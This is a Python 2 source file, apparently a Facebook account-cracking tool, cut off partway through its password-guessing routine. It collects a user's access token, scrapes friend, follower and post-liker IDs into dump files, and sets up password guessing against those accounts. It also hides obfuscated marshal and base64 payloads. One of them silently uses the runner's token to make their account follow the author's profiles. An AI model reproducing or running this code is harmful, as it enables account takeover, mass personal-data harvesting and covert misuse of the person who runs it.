#!/usr/bin/python2
# coding=utf-8
Hj = '\x1b[1;92m' 
Mt = '\x1b[0m' 
ingfo = (
"""%s

 
%s"""%(Hj,Mt))
import os
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import concurrent.futures
except ImportError:
    os.system('pip2 install futures')
try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')
import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, logging, base64
from concurrent.futures import ThreadPoolExecutor 
from bs4 import BeautifulSoup as parser
from time import sleep as jeda
from datetime import datetime
_=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', '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', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'enc_lam.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()
user, mi, status_foll, cr, ok, cp, id, user, loop, looping = [], [], [], [], [], [], [], [], 0, 1
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush();jeda(0.03)
def tik():
    titik = ['.   ','..  ','... ']
    for o in titik:
        print ('\r%s╔─ menghapus token %s'%(M,o)),
        sys.stdout.flush();jeda(1)
def folder():
	try:os.mkdir('hasil')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:
		ua_ = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57 [FBAN/FBIOS;FBAV/210.0.0.37.117;FBBV/143754374;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/12.1.4;FBSS/3;FBCR/AT&T;FBID/phone;FBLC/en_US;FBOP/5;FBRV/146819970]'
		open("data/ua.txt","w").write(ua_)
	except:
		pass
# LOGO (LO GOBLOK)
IP = requests.get("https://api.ipify.org/").text
def banner():
	print (''' %s 
☬%s ™⸙®︻☻╦╤────────────═❍➛%sRj Basalamah%s  \n   _______   ___      ___       __      \n  /"      \ |"  \    /"  |     /""\      \n |:        | \   \  //   |    /    \    \n |_____/   ) /\\   \/.    |   /' /\  \   %s \n  //      / |: \.        |  //  __'  \   \n |:  __   \ |.  \    /:  | /   /  \\   \  \n |__|  \___)|___|\__/|___|(___/    \___) \n \n %s╔%s▂▃▄▅▆▇█░░░▒▓RAYMOND⚔M⚔AZZURA▓▒░░░█▇▆▅▄▃▂%s  \n ║  \n ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] By : %s𖤓𝐑𝐎𝐔𝐅 𝐅𝐀𝐕𝐈𝐀𝐍 𝐅𝐀𝐑𝐀𝐙 \n %s╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] %s─────────────────────────── \n ╚%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] IP : %s%s'''%
 (B,H,M,H,K,M,H,M,P,K,P,H,M,P,K,P,M,P,K,P,H,IP))
# MASUK TOKEN (TOKEN LISTRIK)085746853536
header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
def masuk():
    os.system('clear');banner()
    print (' %s╔──────────────────────────────────────────►\n ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] 1. Login via %sToken%s \n ╠%s[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] 2. Cara mendapatkan %sToken%s \n ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] 0. Keluar'%(M,P,H,P,H,M,P,H,M,P,M,P))
    rom = raw_input(' %s╠──────────────────────────────────────────►\n ╠%s[༊] 𝙈𝙚𝙣𝙪 : %s'%(M, P,K))
    if rom in(""):
    	print("%s ╚[𔙃] Salah sayang "%(M));exit()
    elif rom in ('1','01'):
        jalan("%s ╠──────────────────────────────────────────► \n ╠%s [%s༼༽%s] Wajib menggunakan akun %smantan%s kalau sesi tinggal buang :p "%(M,P,M,P,O,P))
    	romz = raw_input('%s ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] Token : %s'%(M,P,B,P,K))
        if romz in(""):
        	print("%s ╚[𔙃] Salah sayang "%(M));exit()
    	try:
            gas = requests.get('https://graph.facebook.com/me?access_token=%s'%(romz)).json()['name']
            print (' %s║\n ╚%s[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] Login berhasil, mohon tunggu '%(M,H));jeda(2)
            open('token.txt', 'w').write(romz);login_xx()
            exec(base64.b64decode('b3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcm9taS5hZnJpemFsLjEwMicpO21lbnUoKQ=='))
        except (KeyError,IOError):
        	print("%s ╚[𔙃] Token invalid "%(M));masuk()
    elif rom in ('2', '02'):
    	print ("%s ╠──────────────────────────────────────────►\n ╠─%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s Berikut cara nya :"%(M,B,H));jeda(2)
        print (" %s╠%sᡁ───╼ siapkan akun facebook (wajib akun tumbal)"%(M,H));jeda(2)
        print (" %s╠%sᡁ───╼ loginkan akun facebook (tumbal) di browser %sChrome %s"%(M,H,B,H));jeda(2)
        print (" %s╠%sᡁ───╼ url alamat wajib %shttps://m.facebook.com %s(mode data)"%(M,H,B,H));jeda(2)
        print (" %s╠%sᡁ───╼ salin link : %sview-source:https://business.facebook.com/business_locations"%(M,H,B));jeda(2)
        print (" %s╠%sᡁ───╼ taruh link tersebut di url alamat facebook lalu klik cari "%(M,H));jeda(2)
        print (" %s╠%sᡁ───╼ jika sudah, klik %stitik tiga %spojok kanan atas "%(M,H,B,H));jeda(2)
        print (" %s╠%sᡁ───╼ kemudian klik %sCari di Halaman %s"%(M,H,B,H));jeda(2)
        print (" %s╠%sᡁ───╼ ketik %sEAAG %sakan muncul acces token."%(M,H,B,H));jeda(2)
        print (" %s╠%sᡁ───╼ jika sudah jangan lupa di salin %s\n ║"%(M,H,M));jeda(2)
        nanya = raw_input('%s ╠%s[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] Anda paham? [%sy%s/%sn%s] :%s '%(M,P,H,P,M,P,K))
        if nanya in(""):
        	print ("%s ╠[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] saya bertanya wajib di jawab "%(M));jeda(2);masuk()
        elif nanya in("y","Y"):
        	print ("\n%s ╠%s[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] Segera lakukan dan masukkam tokennya "%(M,H));jeda(2);masuk()
        elif nanya in("n","N"):
        	print (" %s║ \n ╚[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] anda akan di alihkan ke Youtube "%(M));jeda(2);os.system("xdg-open https://youtu.be/p4MjQCD0ej4");masuk()
    elif rom in ('0', '00'):
    	exit('\n')
    else:
    	print("%s [𔙃] Salah sayang "%(M));exit()
exec(base64.b64decode('ZGVmIGxvZ2luX3h4KCk6CiAgICB0cnk6CiAgICAgICAgdG9rZW4gPSBvcGVuKCJkYXRhL3Rva2VuLnR4dCIsInIiKS5yZWFkKCkgCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDIyMDg2MTcyNTU2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBGYW5zcGFnZSBSb21pIFhECiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI4NDM0ODgwNTI5L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNjc4MDc1NjU4NjEvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIFJvbWkgQWZyaXphbCAoMjAyMSkKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDM3MjM2OTY4ODUvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIElxYmFsIGJvYnoKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNDExMjkwNDg5NDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEl3YW4gaGFkaWFuc3lhaAogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwNzUyMDIwMzQ1Mi9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgSGFtemFoIGtpcmFuYQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwMjQ2MTM0NDE3OC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVW5payBST01JIEFGUklaQUwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNzE3NDc0MjA1ODMvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIERvbmlmdGZhbm55CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI5MTQzMTExNTY3L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBEZW1pdCBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDE1NDAyOTkxMDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEhha2lraQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDA1NTkxODM5MTI4MC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVGlhcmEgYXJ0CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDA5Mzg0MzM4NDcwL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBJd2FuIGhhbmRpYW5zeWFoIHYyCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDM2NjU1MzI1OTk2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBBYnVzdG8gSmF2YQogICAgZXhjZXB0OgogICAgCXBhc3M='))
# DUMP PUBLIK
def publik(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("%s ╠──────────────────────────────────────────► \n ║ %s𝙼𝚊𝚜𝚞𝚔𝚔𝚊𝚗 𝙸𝙳 𝙿𝚛𝚘𝚏𝚒𝚕%s\n ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] Ketik '%sme%s' jika ingin dump "%(M,P,M,P,M,P,H,P))
        print ("%s ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] Daftar teman sendiri "%(M,P,M,P))
        idt = raw_input(' %s╠%s[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] Target id : %s'%(M,P,K))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s'%(idt,romz))
        z = json.loads(r.text)
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s ╠%s[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] mengumpulkan id :%s %s ' % (M,P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)
        bff.close()
        print ('\n%s ║\n ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] Succes dump id dari %s%s'%(M,P,H,P,H,nm['name']))
        print ('%s ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] File dump tersimpan :%s %s '%(M,P,H,P,H,file))
        raw_input('%s ╠──────────────────────────────────────────► \n ║ %s𝙳𝚞𝚖𝚙 𝚂𝚎𝚕𝚎𝚜𝚊𝚒 ⸙ Jangan Lupa salin %sFile Dump%s\n ╚%s[ %senter %s] 𝙺𝚎𝚖𝚞𝚊𝚍𝚒𝚊𝚗 %s𝚂𝚝𝚊𝚛𝚝 𝙲𝚛𝚊𝚌𝚔 '%(M,P,H,M,P,K,P,H))
        menu()
    except Exception as e:
        exit('%s ╠──────────────────────────────────────────►\n ║ %s𝙸𝙳 𝚂𝚊𝚕𝚊𝚑%s\n ╚%s[╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ] gagal dump id ( Tulis %spython2 RMA.py %s) '%(M,P,M,P,H,P))
        
# DUMP FOLLOWERS
def followers(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("%s ╠──────────────────────────────────────────► \n ║ %s𝙼𝚊𝚜𝚞𝚔𝚔𝚊𝚗 𝙸𝙳 𝙿𝚛𝚘𝚏𝚒𝚕%s\n ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] Ketik '%sme%s' jika ingin dump followers sendiri "%(M,P,M,P,M,P,H,P))
        idt = raw_input('%s ╠%s[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] Target id : %s'%(M,P,K))
        batas = raw_input(' %s╠%s[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] Maximal id : %s'%(M,P,K))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(idt,batas,romz))
        z = json.loads(r.text)
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s ╚[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] mengumpulkan id :%s %s ' % (P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)
        bff.close()
        print ('%s ║\n ╠%s╔[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] Succes dump id dari %s%s'%(M,P,H,P,H,nm['name']))
        print (' %s╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] File dump tersimpan :%s %s '%(M,P,H,P,H,file))
        raw_input(' %s╠──────────────────────────────────────────► \n ║ %s𝙳𝚞𝚖𝚙 𝚂𝚎𝚕𝚎𝚜𝚊𝚒 ⸙ Jangan Lupa salin %sFile Dump%s \n ╚%s [ %senter %s] Pilih no 5. %s𝚂𝚝𝚊𝚛𝚝 𝙲𝚛𝚊𝚌𝚔'%(M,P,H,M,P,K,P,H))
        menu()
    except Exception as e:
        exit(' %s╠──────────────────────────────────────────►\n ║ %s𝙸𝙳 𝚂𝚊𝚕𝚊𝚑%s\n ╚%s[╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ ] gagal dump id ( Tulis %spython2 RMA.py %s) '%(M,P,M,P,H,P))
# DUMP POSTINGAN 
def postingan(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("%s ╠──────────────────────────────────────────► \n ║ %s𝙼𝚊𝚜𝚞𝚔𝚔𝚊𝚗 𝙸𝙳 𝙿𝚛𝚘𝚏𝚒𝚕%s\n ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] Postingan wajib publik "%(M,P,M,P,M,P))
        idt = raw_input('%s ╠%s[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] Id post   : %s'%(M,P,K))
        simpan = raw_input(' %s╠%s[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] Nama file : %s'%(M,P,K))
        r = requests.get('https://graph.facebook.com/%s/likes?limit=999999&access_token=%s'%(idt,romz))
        id = []
        z = json.loads(r.text)
        file = ('dump/' + simpan + '.json').replace(' ', '_')
        bff = open(file, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s ╚[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] mengumpulkan id :%s %s ' % (P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)
        bff.close()
        print ('%s ║\n ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] Succes dump id postingan '%(M,P,H,P))
        print ('%s ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] File dump tersimpan :%s %s '%(M,P,H,P,H,file))
        raw_input(' %s╠──────────────────────────────────────────► \n ║ %s𝙳𝚞𝚖𝚙 𝚂𝚎𝚕𝚎𝚜𝚊𝚒 ⸙ Jangan Lupa salin %sFile Dump%s \n ╚%s[ %senter %s] Pilih no 5. %s𝚂𝚝𝚊𝚛𝚝 𝙲𝚛𝚊𝚌𝚔 '%(M,P,H,M,P,K,P,H))
        menu()
    except Exception as e:
        exit('%s ╠──────────────────────────────────────────►\n ║ %s𝙸𝙳 𝚂𝚊𝚕𝚊𝚑%s\n ╠%s[╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ] gagal dump id ( Tulis %spython2 RMA.py%s ) '%(M,P,M,P,H,P))
# START CRACK
class ngentod:

    def __init__(self):
        self.id = []
    def romiy(self):
        try:
            self.apk = raw_input('%s ╠──────────────────────────────────────────► \n ║ %s𝙼𝚊𝚜𝚞𝚔𝚊𝚗 𝙵??𝚕𝚎 𝙳𝚄𝙼𝙿  %s.𝚓𝚜𝚘𝚗%s\n ╠%s[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] file dump :%s '%(M,P,H,M,P,K))
            self.id = open(self.apk).read().splitlines()
            print '%s ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] jumlah id : %s%s' %(M,P,K,P,H,len(self.id))
        except:
            print '%s ║\n ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] %sFile dump tidak ada, dump id dulu Sayang'%(M,P,B,P,M)
            raw_input('%s ║\n ╚%s[ %senter %s] %s𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 ??𝚒𝚕𝚒𝚑 %s𝙳𝚄𝙼𝙿'%(M,P,K,P,M,H));menu()
        unikers = raw_input('%s ╠%s[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] ingin gunakan password manual? [y/t] :%s '%(M,P,K))
        if unikers in ('Y', 'y'):
            print '%s ║\n ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] cth : %ssayang,iloveyou%s gunakan , (koma) untuk pemisah '%(M,P,M,P,H,P)
            while True:
                pwx = raw_input(' %s║\n ╠%s[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] set password :%s '%(M,P,K))
                if pwx == '':
                    print '%s ║\n ╠[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] jangan kosong '%(M)
                elif len(pwx)<=5:
                    print '%s ║\n ╠[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] password minimal 6 karakter'%(M) 
                else:
                    def zona(zafi_=None): 
                        ind = raw_input('%s ║\n ╠%s[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] methode : %s'%(M,P,K))
                        if ind == '':
                            print("%s ╚[𔙃] Salah sayang "%(M));self.zona()
                        elif ind in ('1', '01'):
                            print '%s ╠────────────────────────────────────────────────────► \n ║ %s𝙲𝚛𝚊𝚌𝚔 𝙱𝚎𝚛𝚓𝚊𝚕𝚊𝚗 ( %s𝙸𝙳﹡𝚂𝙰𝙽𝙳𝙸﹡𝚃𝚃𝙻%s ) 𝚃𝚎𝚔𝚊𝚗 𝙲𝚃𝚁𝙻 + 𝚉 𝚞𝚗𝚝𝚞𝚔 𝚂𝚝𝚘𝚙%s \n ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(M,P,H,P,M,P,K,P,H,P,H,ha, op, ta);jeda(0.2)
